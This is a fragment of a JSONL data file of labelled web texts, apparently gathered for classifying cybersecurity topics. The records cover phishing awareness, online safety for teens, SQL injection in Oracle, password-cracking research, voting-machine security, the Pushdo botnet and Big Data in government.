Most Valuable Professional award, and has written extensively on Microsoft BI software on his blog. Prior to Accenture, Mehta was in Capgemini.\nThis was first published in August 2011", "label": 1}
{"text": "Spam and Phishing Emails\nPhishing emails are messages sent by individuals trying to \"fish\" for personal or financial information. Phishers are getting better every day at making their messages look authentic. There are two types of phishing emails:\n- Emails that ask you to reply to the message with confidential information, such as your user ID and password. Never respond to any email with confidential information. UH and other legitimate businesses will never ask for this information via email.\n- Emails that ask you to click on a link to a web page, which then asks you to provide confidential information. Many times these web pages look like legitimate sites, such as Bank of America or PayPal, but they are not. When you provide your user ID and password, this information is captured by the phisher, who can then use it to log into the legitimate site.\nWhat to do if you get a phishing email\n- Send any phishing emails you receive, including its full header information, to firstname.lastname@example.org.\n- If you suspect it may be a phishing email, UIT Security can review the message and advise if it is legitimate or not.\n- If you know it is a phishing email, UIT Security can take measures to have the phishing web site taken down.\n- Never respond to any email with confidential information. UH and other legitimate businesses will never ask for this information via email.\n- Use your mouse to hover over links in an email. This will show you the actual website you will be directed to if you click on the link. It is always best to type the address yourself into your web browser, rather than clicking a link in an email.\nHow to identify a phishing email\n- May show the sender on behalf of someone, such as the University of Houston and generally do not contain the sender's email.\n- May contain fuzzy logo symbols which are not genuine.\n- May not contain email signatures or any contact information.\n- May have bad grammar and capitalization.\n- Generally require you to take quick action, such as verifying your account to prevent it from being deactivated.\nBe particularly vigilant during holidays or significant events since attackers heighten their activity during these times.\nHow to Protect Yourself\nHere are some best practices that will help protect you and your information:\n- Beware of messages that claim your account has been suspended.\n- Be suspicious of any email with urgent requests for personal financial information.\n- Never click on a link in an email. Instead, always type the legitimate Web address of the site you want to reach directly into your Web browser.\n- Be suspicious of email messages and other electronic communications from sources you do not know or recognize\n- Use the latest versions of your operating system (OS) and applications.\n- Have the latest security software updates (patches) installed. This includes patches for your OS and applications.\n- Keep your anti-virus software up to date.\n- Report any suspicious emails", "label": 1}
{"text": "Google: A New Tool For U.S. Intelligence?http://www.npr.org/2011/03/25/134666365/a-new-tool-for-u-s-intelligence-google\nTraditionally, intelligence agencies have relied on top-secret information to track changes in other countries. But wiretaps and secret intercepts didn't help U.S. officials predict the Arab Spring that has brought revolution across the Middle East and North Africa.\nIn hindsight, officials say they could have found some clues about what was about to happen if they had read open sources more closely. Now they are searching for systematic ways to do that.\nThe uprisings in the region have shown intelligence officials that they need new ways to understand what motivates people around the world. While traditional intelligence tools can help, they are limited in their ability to put their fingers on the pulse of society or anticipate fickle human behavior.\n\"The traditional intelligence community is absolutely biased toward classified information,\" said Lt. Col. Reid Sawyer, an Army intelligence officer and head of West Point's Combating Terrorism Center. \"I think that open source provides a critical lens into understanding the world around us in a much more dynamic way than traditional intelligence sources can provide.\"\nOpen sources include newspapers, local radio shows and, of course, Facebook and Twitter. The problem, intelligence officials will tell you, is tapping into all of that in a systematic way.\nPredicting Political Unrest\nGabriel Koehler-Derrick, an instructor at West Point, and Joshua Goldstein, a researcher at Princeton University, think they may have at least a partial solution. They are seeing if they can tap into the mood of the country by tracking what its citizens are searching for online. And the way they do that is by using the search engine Google Trends.\n\"What we did was a comparison of search terms over time starting from the moment the Internet was plugged back in by the government of Egypt on Jan. 25, and moving forward for a period of about 30 days to see what we could find out,\" Koehler-Derrick says. As he saw it, it was an electronic way of taking a very broad poll.\nGoogle Trends is basically a way of looking at what people are focusing on by mapping out their Google searches. Marketing firms have been using Google Trends for some time. The government has, too. Back in 2009, during the swine flu epidemic in the U.S., the National Institutes of Health used Google Flu Trends to track outbreaks of the disease.\nIt turns out that when people started to feel feverish and nauseous, they would go to Google to check out their symptoms. While it wasn't a perfect indicator, Google Flu Trends often beat government predictions about flu outbreaks by a week or more. Imagine using the Internet to do the same thing in predicting political unrest.\nUnderstanding The Mood Of A Country\n\"Google Trends allows us to get a sense of atmospherics,\" Koehler-Derrick says. \"There are approximately 16 million Internet users in Egypt. Now, this is undoubtedly a demographic that is biased toward younger people. If you put Google's market share at 10 percent, which I think is absurdly low, then that is 1.6 million users that we have essentially surveyed for 30 days.\"\nHe and Goldstein searched Google using Arabic because that would better measure what locals are interested in. Using the search term \"Tunis,\" they wanted to see how many Egyptians were following the demonstrations in Tunisia. They compared the number of Google searches for \"Tunis\" with the number of Google searches for pop stars in Egypt.\n\"Typically, as I think you'd find in the United States, pop stars trump almost any search you can think of,\" Koehler-Derrick says. \"But the search for Tunis prior to the demonstrations that kicked off in late January were surprisingly high.\"\nSawyer says this kind of information is vital to understanding the mood of a country and would supplement the kind of information gleaned from more traditional intelligence methods.\nConsider the debate raging in Washington, D.C., about the Muslim Brotherhood as the revolution unfolded in Egypt, he says. There were concerns in the U.S. intelligence community that the Muslim Brotherhood, an Islamic political group, might come to power.\n\"If the decision makers could have understood how little the Muslim Brotherhood was animating the online searches inside of Egypt,\" Sawyer continued, \"how might it have led to different decisions or different discussions, at least, that were being held in the halls of Washington?\"\nIn other words, few seemed interested enough in the Muslim Brotherhood to search for them on Google. So how much of a role could the group have been playing in day-to-day conversations in Egypt?\nStill, Google Trends can't predict the future. But it could be one more tool for intelligence officials who want to tap into the private conversations that could spark popular movements.", "label": 1}
{"text": "Proactive parents and teachers can help keep kids safe online\n(BPT) - If your teen is among the 93 percent of 12- to 17-year-olds using your family’s laptop, smartphone or tablet to surf the Internet, they are vulnerable to multiple cyber threats, many of which could be detrimental.\nMoreover, teens do not realize the abundance of threats awaiting them, nor do they recognize a tweet or photo upload can impact not only their reputation and future, but their safety, as well. Microsoft’s research shows that 55 percent of teens say they give little or no thought to the consequences of posting something online.\nAnd, according to a recent survey, 1 in 4 parents are overwhelmed by technology and just hope for the best.\n“As hackers continue plotting attacks, the increase in vulnerability among teens is likely, but parents may not realize they are actually the first line of defense in keeping their families safe online,” says Linda McCarthy, cyber security expert, former senior director of Internet safety at Symantec and author of Own Your Space: Keep Yourself and Your Stuff Safe Online.\nThe increase in prospective cyber threats provides opportunities in the career field of cyber security. If your teen enjoys spending time online, it’s never too early to begin discussing the education required to enter this field.\nCyber security related fields are projected to grow more than 28 percent by 2020, according to the U.S. Bureau of Labor Statistics. DeVry University, which has partnered with McCarthy to provide complimentary copies of the Own Your Space eBook to parents, teachers and teens, recognizes the growing need for professionals with the skills required to protect individuals and organizations from cyberattacks. By also partnering with technology leaders like Cisco and Microsoft, its students are provided with a mix of relevant theoretical and hands-on education.\nFor concerned parents and teachers, McCarthy offers the following advice to help protect teens online:\n1. Protect equipment. Install and update antivirus software, spyware protection and firewalls.\n2. Realize social networking sites are here to stay. Review your teen’s Facebook and Twitter profiles. Make sure they do not display personal information such as full names, addresses or school names.\n3. Boost password strength. Utilize a mixture of letters, numbers and characters. And most importantly, never share passwords with anyone.\nCyber security is a moving target, and as threats develop daily, it’s imperative for parents and teachers to educate teens about these dangers. “The goal is to inform and educate teens, not scare them about the dangers of sharing information online,” says McCarthy. “By protecting your family’s devices and empowering teens with the information needed to recognize impending threats, cyber sabotage is avoidable.”\nTo download a complimentary copy of Linda McCarthy’s eBook, Own Your Space: Keep Yourself and Your Stuff Safe Online, visit DeVry.edu/OwnYourSpace.", "label": 1}
{"text": "SQL Injection and Oracle, Part Two\nDecember 4, 2002[From SecurityFocus]\nSQL Injection is a way to attack the data in a database through a firewall protecting it. It is a method by which the parameters of a Web-based application are modified in order to change the SQL statements that are passed to a database to return data. For example, by adding a single quote (') to the parameters, it is possible to cause a second query to be executed with the first.\nSQL injection techniques are an increasingly dangerous threat to the security of information stored upon Oracle Databases. These techniques are being discussed with greater regularity on security mailing lists, forums, and at conferences. There have been many good papers written about SQL Injection and a few about the security of Oracle databases and software but not many that focus on SQL injection and Oracle software.\nThis is the second part of a two-part article that will examine SQL injection attacks against Oracle databases. The first installment offered an overview of SQL injection and looked at how Oracle database applications are vulnerable to this attack, and looked at some examples. This segment will look at enumerating the privileges, detecting SQL injection attacks, and protecting against SQL injection.\nThe complete article is available at http://online.securityfocus.com/infocus/1646.", "label": 1}
{"text": "\"Hammered asinine requirements\": Now there’s a secure password\n- — 24 January, 2013 18:08\nYoure best off forgetting your grammar lessons when it comes to creating passphrases, according to new research out of Carnegie Mellon University and MIT.\nThe researchers say that using grammar good or bad can clue in hackers about the words in a multi-word password. And theyve built an algorithm as a proof-of-concept to show it (The team, led by software engineering Ph.D. student Ashwini Rao of CMUs Institute for Software Research, will present its research at the Association for Computing Machinerys Conference on Data and Application Security and Privacy on Feb. 20 in San Antonio.).\nThe team tested its grammar-aware password cracking algorithm against 1,434 passwords containing 16 or more characters, and cracked 10% of the dataset via the algorithm.\nWe should not blindly rely on the number of words or characters in a password as a measure of its security, Rao said, in a statement.\nThe researchers say that while a password based on a phrase or short sentence can be easier for a user to remember, it also makes it simpler to crack because grammatical rules narrow word choices and structures (in other words, a passphrase with pronoun-verb-adjective-noun would be easier to crack than one made up of noun-verb-adjective).\nThe researchers found that Hammered asinine requirements, for instance, is harder to crack than even the longer and seemingly clever Th3r3 can only b3 #1!\nPasswords in general have come under increasing fire by security pros, as some of the highest profile breaches (LinkedIn, Nvidia) have been the result of password compromises or resulted in passwords (including encrypted ones) being made public.\nGoogles security team is looking into ways to avoid passwords altogether for logging into websites.\nRead more about wide area network in Network World's Wide Area Network section.", "label": 1}
{"text": "WASHINGTON — A series of problems with electronic voting machines has raised fresh questions about election technology as newer computerized systems gain ground for the 2012 US election.\nAs many as 25 percent of Americans are expected to use paperless electronic voting machines in the upcoming November elections, according to the Verified Voting Foundation, but confidence has been eroded by incidents showing vulnerabilities.\nThe foundation, which seeks more reliable election systems, contends that voting machines in 11 states are all-electronic, with no paper systems for recounts, and that many other jurisdictions have some of these systems in place.\nLast year, Microsoft Research published a paper describing vulnerabilities to what had been described as \"fully verifiable\" direct recording electronic (DRE) systems in which a hacker can \"undetectably alter large numbers of votes.\"\nSeparately, scientists at Argonne National Laboratory described a way to tamper with certain electronic voting machines by inserting a $10 component along with a $15 radio frequency device to alter vote results.\nPamela Smith of the Verified Voting Foundation said these incidents highlight the fact \"that you can have insider challenges as well as outsider hacks. It points out that you have to be able to check the system.\"\nElection security and technology has been an issue in the United States since the 2000 president election marred by \"hanging chads\" in Florida that muddled the result.\nUS laws enacted since then encourage the use of new technology including touch-screen ballots. But some critics say these can be vulnerable to hackers and that some lack a \"paper trail\" which could allow a recount in case of machine failure.\n\"We still have a number of states which do not have what I call resilient recountable systems,\" Smith said.\n\"If they do have problems they may not be able to recover from them. So we would like states to move to recoverable systems where they could do a recount if there were a problem.\"\nLast September, researchers led by Roger Johnston at the Argonne lab were able to change votes on the a ballot machine using about $25 worth of equipment, by inserting a device to manipulate touch screens by remote control\n\"We believe these 'man in the middle attacks' are possible on a wide variety of voting machines,\" with little technical expertise, Johnston said.\nIn October, Microsoft Research released a paper describing a so-called \"trash attack\" which it said could be \"effective against the majority of fully verifiable election systems.\"\nIt is known as a trash attack because it would allow a corrupt elections worker, for example, see a voter dumping a receipt on the way out from a polling station, and then modify the vote without detection, and with no way to verify the original vote. Microsoft also offered a technical fix for this weakness.\nDan Wallach, a Rice University computer scientist, said little has changed since reports about vulnerabilities in voting machines began around 2007.\n\"Anybody trying to compromise them could have read all the public reports in 2007 and now, five years later, they've had lots of time to engineer attacks,\" Wallach said.\nWallach said it is not clear if any elections have been compromised by computer intrusions: \"We don't know. If they were doing it and were doing it skillfully, we'd never know.\"\nOther countries have faced similar issues. The Netherlands scrapped electronic voting several years ago after a high-profile hacking incident. Ireland also abandoned the use of Dutch-made voting machines. Controversies have arisen over security of voting machines in India and several other countries.\nRichard Soudriette, president of the Colorado-based Center for Diplomacy and Democracy, said it was \"unfortunate that electronic voting systems have taken on such a negative connotation.\"\n\"I think it is entirely possible to build trustworthy and verifiable systems. But there has been so much negative publicity about electronic voting, I don't think it's going to make a revival.\"\nCharles Stewart, a political scientist at the Massachusetts Institute of Technology and faculty member of the Voting Technology Project of MIT and the California Institute of Technology, said he is \"more comfortable than most people\" with the new systems, while acknowledging that any system can be vulnerable.\n\"I trust my computer scientist friends when they tell me all the ways you can hack into the machines,\" he said. \"But I've yet to see an election hacked.\"\nStewart that if the 2012 presidential race is a runaway, few will notice any flaws in vote technology. But if it is a tight race, \"I can easily imagine in a state like Ohio or Florida or Pennsylvania, if there are one or two counties where things go wrong, that could raise this issue again.\"\nCopyright © 2013 AFP. All rights reserved. More »", "label": 1}
{"text": "More business transactions occur electronically every year, and organizations are retaining a growing volume of sensitive data. For many organizations, data has become an invaluable asset — the lifeblood of their operations. Access to this data is available to an expanding user base, including employees, business partners, suppliers and customers. IT infrastructures are more extensive, more complex, more distributed — and more accessible.\nThis interconnectedness affords many benefits for businesses, government agencies and consumers alike — but it also potentially introduces a great deal of risk. The more access points an organization maintains, the greater the possibility of compromised systems or data theft.\nTo help secure their data, companies have generally focused much of their efforts on protecting themselves from threats from outside of the organization. However, a growing wave of data losses caused by human error and fraud from within the organization illustrate the degree of risk to companies and government agencies. And the stakes are high — especially as repositories of private information expand.\nGrowing public concern over the security and privacy of personal data has placed many companies and government agencies in the spotlight — and countries around the world are developing regulations designed to support confidentiality.\nIn a recent global business security report, IBM identified a burgeoning trend toward small, targeted insider attacks — rather than sweeping global threats such as worms, spam, viruses and other malware. Insider attacks can be a significant threat to the security and privacy of data.", "label": 1}
{"text": "For most people, the web browser is central to what you do on your computer. Companies are increasingly putting more and more services on the web and are encouraging their customers online. Securing your web browser is a vital part of surfing the web safely and keeping your computer free of viruses, spyware and other threats.\nMost people own a computer which runs Microsoft Windows XP or other variants of the Windows operating system. This means that by default most people use Microsoft’s Internet Explorer browser and therefore hackers focus their efforts on finding vulnerabilities in this program.\nThe most important step you can take to securing your web browser is to make sure that the version you are using is the most current version and has all the latest patches or updates installed. Hackers exploit vulnerabilities in the software to steal personal information and take control of your computer. Make sure that automatic updates are switched on and that you immediately install any updates you are prompted to download.\nGiven the well documented issues with Internet Explorer it is worth considering an alternative browser like Mozilla Firefox or the Opera Desktop Browser. You will still need Internet Explorer for some sites, however due to the increased popularity of the Firefox browser most sites now work with both Internet Explorer and Firefox as standard. Both alternatives pack some impressive features liked tabbed browsing which Microsoft is only just catching up on. Switching browser does not mean that you are 100% secure but there is currently a much reduced likelihood of being impacted by security issues.\nRegardless of what web browser you use a lot of information about your surfing habits is stored on your computer. Common items include the URLs or web pages you visit, files which have been downloaded, “Cookie” files which websites put on your computer and parts of the web pages you have viewed. It is therefore good practice to scrub this information on a regular basis. You can do this manually through your browser’s Options menu or use a free software tool like CCleaner which is highly recommended.\nThe good news is that the computer security industry is developing some great new products and services to help you protect yourself online. There appears to be an increasing emphasis on developing tools which help prevent your computer being infected in the first place.\nA good example of this is a web browser plug-in called “SiteAdvisor” which was recently bought by McAfee.\nSiteAdvisor gives each website it visits a red, yellow or green rating based on various tests it carries out. These ratings then conveniently appear next to search results in Google and other search engines. This helps users determine whether a website is safe to visit. Anti-spyware tools like Webroot’s Spy Sweeper and PC Tools’ Spyware Doctor also include sophisticated active protection features as standard.\nRichard Rogers runs a number of computer-related sites offering Spyware Remover and Anti Virus Software help.\nArticle Source: http://EzineArticles.com/?expert=Richard_Rogers", "label": 1}
{"text": "More than 300 Web sites are being pestered by infected computers that are part of the Pushdo botnet, according to security researchers.\nThe U.S. Federal Bureau of Investigation, Twitter and PayPal are among the sites being hit, although it doesn't appear the attacks are designed to knock the sites offline, said Steven Adair, of The Shadowserver Foundation, a group that tracks botnets.\nShadowserver was tipped off to the Pushdo issue by Joe Stewart, director of malware analysis at vendor SecureWorks Inc.\nPushdo, which is also known as Pandex or Cutwail, has been around for about three years, according to a report from Trend Micro Inc. (OTC:TMICY). Computers infected with Pushdo are used to send out spam, but the malware is capable of downloading other harmful code to a computer.\nPusho appears to have been recently updated to cause computers infected with it to make SSL (Secure Sockets Layer) connections to various Web sites. SSL is an encrypted protocol used to protect information exchanged.\nThe bots start to create an SSL connection and then disconnect, a process that is repeated, Adair said. Serving up SSL connections puts more of a burden on a Web site than HTTP connections, Adair said, but the traffic has been so sporadic that some large Web sites didn't even notice.\n\"Despite how noisy it is, the traffic is still too infrequent and not large enough to really be seen as what we would think is an intentional DDOS attack,\" Adair said in an e-mail exchange. \"Much smaller botnets are capable of generating far more traffic and causing more of an impact to Web sites than what is being done with Pushdo.\"\nThe traffic, however, is significant and results in large Web sites getting millions of hits across hundreds of thousands of IP (Internet Protocol) addresses. \"This might be a big deal if you're used to only getting a few hundred or thousands of hits a day or you don't have unlimited bandwidth,\" Adair wrote on Shadowserver's blog.\nOne option for Web sites is to change their IP addresses, but that may only be a temporary fix. \"We have also had numerous people write in offering assistance and feedback on ways to slow or stop these attacks,\" Adair said. \"We hope to put out an updated post that can help our system administrators associated with these Web sites soon.\"", "label": 1}
{"text": "McKinsey & Company released a report last year titled BigData: TheNextFrontierforInnovation, Competition, andProductivity. One of the conclusions in this often-quoted analysis is that Government has the potential to see a larger benefit from the use of Big Data than any other economic sector except Finance and Insurance.\nIn part 1a of this blog, I’ll address, at a very high level, what makes Big Data different from the data of ten years ago and why Big Data solutions unlock new approaches to turning data into information and information into knowledge that can be acted upon.\nIn part 1b, I’ll offer practical examples of how government can leverage the Big Data techniques being aggressively exploited in the commercial world.\nIn Part Two, we’ll take a look at the technology stack for Big Data, frequently referred to as the SMAQ stack: Storage, MapReduce and Query. I will also answer the question that you’ve wanted to ask: Why is Pig Latin the key to the SMAQ stack?\nIn Part Three, we’ll cover the array of Big Data products and services that DLT Solutions offers in partnership with Oracle, RedHat, NetApp, QuestSoftware, Google, Informatica, Quantum, SoleraNetworks, and Amazon. Big Data GPS products from our vendor partner TomTom will be covered in Part 1.\nWhat is Big Data and how is it different from my data?\nAlthough there is no ‘industry standard’ definition for Big Data, it is generally referred to as data that has one or more of the following characteristics that contrast with the data you typically use:\nVolume – multiple terabytes or petabytes.\nVelocity – streaming input from ‘always on’ sensors, continuous video feeds, and social media sources like Twitter or Facebook.\nVariety – multiple file types, unstructured text in a wide range of formats from a range of sources, structured data from databases and spreadsheets mixed with unstructured data.\nWith the exception of government agencies involved in intelligence collection or major science projects, few have had to solve Big Data problems. However, Google and Yahoo have approached the problem from non-traditional perspectives and developed parallel processing techniques that can be employed on computing grids locally or in the Cloud. Open source software for these techniques have been formalized and brought to market by companies such as Cloudera and Hortonworks . Additionally, in the past 2-3 years, many major software brands have specialized in addressing one or more aspects of Big Data solutions. Selection of components for your Big Data solution, however, will include several issues that you would not normally address in selecting a specific Relational Database Management System RDBMS. More about that in part two.\nWhat is the value of Big Data?\nBig Data solutions are all about identifying valuable information in large datasets of varying quality. Big Data techniques do well at detecting information in low signal-to-noise ratio environments. One analyst’s noise may be another analyst’s gold nugget. For example, if an agency maintains for internal dissemination only the (unstructured) news articles about itself, the agency may miss learning of relevant, innovative solutions developed by a state agency or foreign government agency working on a closely related problem. Since the information sought by any one analyst today may be very different from that sought by another analyst in a month’s time, inexpensive Big Data storage solutions enable the enterprise to keep all data versus only the subset initially perceived to have value.\nAnd it’s not just about storing and searching large amounts of static data. Mining streaming social media for real-time information on disease outbreaks, for example, can provide critical public health data that may save lives.\nNow that I’ve summarized the basic Big Data concepts, part 1b will take a close look at some ways that Big Data might be exploited in the public sector.\nShare this article!", "label": 1}
